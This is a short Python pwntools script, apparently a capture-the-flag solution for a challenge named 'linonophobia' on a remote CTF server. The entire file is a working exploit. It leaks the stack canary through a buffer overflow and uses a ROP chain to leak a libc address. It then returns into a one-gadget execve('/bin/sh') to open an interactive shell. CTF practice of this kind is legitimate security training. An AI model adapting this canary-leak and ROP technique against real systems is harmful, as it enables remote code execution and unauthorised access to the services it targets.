from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

pop_rdi = 0x400873
puts_plt = 0x4005C0
read_got = 0x601028
main = 0x4006B7

# io = process("./linonophobia")
io = remote("chal.imaginaryctf.org", 42006)
io.sendline("a" * 260 + "----")
io.recvuntil(b"----")
canary = u64(io.recv(8)) & ~0xFF
print(hex(canary))
io.sendline(
    b"a" * 264 + p64(canary) + p64(0) + flat([pop_rdi, read_got, puts_plt, main])
)
io.recv(1)
libc_base = int.from_bytes(io.recvline()[:-1], byteorder="little") - 0x111130
print(hex(libc_base))

pop_r12_r13_r14_r15 = 0x40086C
gadget = libc_base + 0xE6C7E  # execve("/bin/sh", r15, r12)

io.sendline("a" * 260 + "----")
io.recvuntil(b"----")
canary = u64(io.recv(8)) & ~0xFF
print(hex(canary))
io.sendline(
    b"a" * 264 + p64(canary) + p64(0) + flat([pop_r12_r13_r14_r15, 0, 0, 0, 0, gadget])
)
io.interactive()
